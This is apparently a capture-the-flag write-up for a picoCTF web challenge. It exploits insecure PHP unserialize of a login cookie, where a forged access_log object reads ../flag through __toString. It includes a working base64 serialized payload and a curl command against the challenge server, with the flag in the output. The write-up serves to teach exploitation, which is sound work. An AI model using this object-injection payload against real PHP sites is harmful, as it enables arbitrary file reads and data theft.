# Writeup - Super Serial
Category: Web Exploitation, Points: 130


## Descpriton
> Try to recover the flag stored on this website [link](http://mercury.picoctf.net:2148/)

A big hint: the flag is at ../flag


## Vulnerability

The basic idea is to access and print out the contents of the file `../flag`. How do we access it?

If we visit the site we get a small page which asks us to fill a username and password. Some basic reconnaissance on the website will tell you it is a php site. Also a `robots.txt` file is present. So we can have a look at it.

```
User-agent: *
Disallow: /admin.phps
```

Here `/admin.phps` is disallowed. The `.phps` means it is a php source file this [link](https://stackoverflow.com/questions/41689479/what-is-the-file-extension-phps-and-what-is-it-used-for) explains it very well. This also means all other `php` files will have a `.phps` extension. So we can explore `index.phps`.

```php
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
	$con = new SQLite3("../users.db");
	$username = $_POST["user"];
	$password = $_POST["pass"];
	$perm_res = new permissions($username, $password);
	if ($perm_res->is_guest() || $perm_res->is_admin()) {
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		header("Location: authentication.php");
		die();
	} else {
		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
	}
}
?>

<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center">Sign In</h5>
							<?php if (isset($msg)) echo $msg; ?>
							<form class="form-signin" action="index.php" method="post">
								<div class="form-label-group">
									<input type="text" id="user" name="user" class="form-control" placeholder="Username" required autofocus>
									<label for="user">Username</label>
								</div>

								<div class="form-label-group">
									<input type="password" id="pass" name="pass" class="form-control" placeholder="Password" required>
									<label for="pass">Password</label>
								</div>

								<button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit">Sign in</button>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
	</body>
</html>
```

If we look at this file, we can see paths to 2 other files. `authentication.php` and `cookie.php`.

So let's look at thier sources.

`cookie.php` -> give `cookie.phps` in the link.

```php
<?php
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}

  function is_admin() {
    $admin = false;

    $con = new SQLite3("../users.db");
    $username = $this->username;
    $password = $this->password;
    $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
    $stm->bindValue(1, $username, SQLITE3_TEXT);
    $stm->bindValue(2, $password, SQLITE3_TEXT);
    $res = $stm->execute();
    $rest = $res->fetchArray();
    if($rest["username"]) {
      if ($rest["admin"] == 1) {
        $admin = true;
      }
    }
    return $admin;
  }
}

if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}

?>
```

Now in this part. 

```php
<?php
if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm); // this line would call $perm.__toString()!
	}
}
?>
```

It unserializes the cookie into a php object. And if the object dosen't have an `is_admin` or an `is_guest` method. We print the object contents.

Printing the object contents means calling the `.__toString` method of an object. Whatever the `.__toString` method returns is what gets printed onto the screen.

Now let's look at the second file.

`authentication.php` -> give `authentication.phps` in the link.

```php
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>

<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center"><?php echo $msg; ?></h5>
							<form action="index.php" method="get">
								<button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit" onclick="document.cookie='user_info=; expires=Thu, 01 Jan 1970 00:00:18 GMT; domain=; path=/;'">Go back to login</button>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
	</body>
</html>
```

Now in the object `access_log`, the `read_log` method returns the contents of a given file. The `__toString` method is used when we print any object. So if we were to print like this 

```php
<?php
$a = new access_log("/path/to/whatever")
echo $a;
//$a.__toString() gets called!
?>
```

We would get the contents of whatever file path we pass in to `access_log`.

The vulnerability, is in the fact that if we were to pass in `../flag` to `access_log`, and get it printed. We could see it's contents. 

That raises 2 questions. 
1. How do we pass in `../flag` to `access_log`?
2. How do we get it printed?


## Exploit

In `cookie.phps` we saw that if there is an error it prints the object contents. If we were to cause an error in `cookie.phps`, we could make a call to `.__toString`.

So if we were to pass `access_log("../flag")` as the `login` cookie and send it to `authentication.phps`. We would cause an error in `cookie.phps` which would inturn make a call to `access_log("../flag").__toString()` printing the contents of `../flag`. 

Hence, we would have to set the `login` cookie to a fake `access_log("../flag")` object.

The plan:

1. Create a fake object string with `serialize(access_log("../flag"))`. Use this online php [compiler](http://sandbox.onlinephpfunctions.com) 
2. Encode it with base64.
3. Pass the encoded string as `login` cookie to `authentication.php`. You can do this with `curl` or the `devtools` from your browser.

```console
$ curl -v --cookie 'login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9' mercury.picoctf.net:2148/authentication.php
*   Trying 18.189.209.142:2148...
* Connected to mercury.picoctf.net (18.189.209.142) port 2148 (#0)
> GET /authentication.php HTTP/1.1
> Host: mercury.picoctf.net:2148
> User-Agent: curl/7.81.0
> Accept: */*
> Cookie: login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Set-Cookie: PHPSESSID=hs6bieo6173kqq7vv8o817bjis; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Content-type: text/html; charset=UTF-8
* no chunk, no close, no size. Assume close to signal end
< 
* Closing connection 0
Deserialization error. picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_8db8f85c}
```

You should get the flag.


## References
[this awesome tutorial](https://github.com/ZeroDayTea/PicoCTF-2021-Killer-Queen-Writeups/blob/main/WebExploitation/SuperSerial.md)
